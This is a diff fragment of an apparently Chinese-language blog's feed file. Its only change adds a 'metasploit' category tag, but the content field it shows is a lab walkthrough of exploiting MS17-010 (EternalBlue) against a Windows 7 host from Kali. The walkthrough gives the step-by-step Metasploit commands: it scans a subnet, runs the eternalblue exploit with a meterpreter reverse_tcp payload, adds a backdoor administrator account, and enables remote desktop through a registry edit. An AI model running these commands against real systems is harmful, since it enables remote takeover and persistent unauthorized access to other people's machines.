@@ -6,6 +6,7 @@
     <content type="text"><![CDATA[受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。 实战利用：攻击机：kali 目标机：win764位 打开msf 搜索msf17-010模块 search msf17-010 use auxiliary/scanner/smb/smb_ms17_010 show option查看配置选项，需要配置的参数，RHOSTS,THREADS： set RHOSTS 192.168.209.0/24 set threads 10 run 扫描探测192.168.209网段下存在漏洞的主机： 发现了一个开445端口有漏洞的主机，接下来进入漏洞利用模块并设置payload use exploit/windows/smb/ms17_010_eternalblue 设置TCP连接 set payload windows/x64/meterpreter/reverse_tcp 用options查看需要配置的选项rhost和lhost 配置完后进行攻击： exploit 成功进入 通过shell对目标机进行控制 net user abc abc /add 将用户abc添加入管理组 net localgroup administrators abc /add 开启远程桌面功能 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f Kali远程桌面连接Win7 rdesktop 192.168.209.160:3389]]></content>
       <categories>
         <category>漏洞利用</category>
+        <category>metasploit</category>
       </categories>
   </entry>
   <entry>
